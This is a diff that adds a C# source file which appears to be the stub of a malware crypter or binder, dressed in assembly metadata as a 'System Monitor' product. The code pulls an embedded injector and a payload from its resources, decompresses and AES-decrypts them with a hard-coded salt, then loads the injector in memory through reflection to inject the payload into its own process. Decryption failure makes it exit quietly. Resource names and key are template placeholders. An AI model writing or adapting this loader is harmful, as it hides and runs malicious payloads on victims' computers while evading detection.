@@ -1,0 +1,113 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+
+[assembly: AssemblyTitle("System Monitor")]
+[assembly: AssemblyFileVersion("1.0.0.0")] //0.0.0.0 format
+[assembly: AssemblyVersion("1.0.0.0")] //0.0.0.0 format
+[assembly: AssemblyDescription("Monitors system")]
+[assembly: AssemblyCompany("Monitor inc.")]
+[assembly: AssemblyProduct("Monitor System")]
+[assembly: AssemblyCopyright("Monitor inc.")]
+[assembly: AssemblyTrademark("Monitor inc.")]
+
+namespace gameBind
+{
+    class Program
+    {
+        public static byte[] ExtractResource(String filename)
+        {
+            ResourceManager Manager = new ResourceManager("[ResName]", Assembly.GetExecutingAssembly());
+            byte[] bytes = (byte[])Manager.GetObject(filename);
+            return bytes;
+        }
+        [STAThread]
+        static void Main(string[] args)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            for(int i = 0; i < 5; i++)
+            {
+                if (Inject())
+                    break;
+            }
+        }
+
+        static bool Inject()
+        {
+            try
+            {
+                
+                byte[] InjRes = ExtractResource("[InjRes]");
+                byte[] PayloadRes = ExtractResource("[PayloadRes]");
+                Thread.Sleep(3000);
+                InjRes = Decompress(InjRes);
+                PayloadRes = Decompress(PayloadRes);
+
+                InjRes = _Decrypt(InjRes, "[EncKey]");
+                PayloadRes = _Decrypt(PayloadRes, "[EncKey]");
+
+                MethodInfo BahNahNah = Assembly.Load(InjRes).GetType("Resource.reflect").GetMethod("Run");
+                bool inj = (bool)BahNahNah.Invoke(null, new object[] { Assembly.GetExecutingAssembly().Location, "", PayloadRes, false });
+                Console.WriteLine("Injected: {0}", inj);
+                return true;
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return false;
+            }
+        }
+
+        private static byte[] _Decrypt(byte[] Payload, string _key)
+        {
+            try
+            {
+                PasswordDeriveBytes pdb =
+                  new PasswordDeriveBytes(_key,
+                  Encoding.UTF8.GetBytes("2388291"));
+                MemoryStream ms = new MemoryStream();
+                Aes aes = new AesManaged();
+                aes.Key = pdb.GetBytes(aes.KeySize / 8);
+                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
+                CryptoStream cs = new CryptoStream(ms,
+                  aes.CreateDecryptor(), CryptoStreamMode.Write);
+                cs.Write(Payload, 0, Payload.Length);
+                cs.Close();
+                return ms.ToArray();
+            }
+            catch
+            {
+                Environment.Exit(0);
+                return new byte[] { };
+            }
+        }
+
+        private static byte[] Decompress(byte[] b)
+        {
+            using (MemoryStream uncompressed = new MemoryStream())
+            {
+                using (MemoryStream compressed = new MemoryStream(b))
+                {
+                    using (DeflateStream ds = new DeflateStream(compressed, CompressionMode.Decompress))
+                    {
+                        ds.CopyTo(uncompressed);
+                        return uncompressed.ToArray();
+                    }
+                }
+            }
+        }
+
+    }
+}
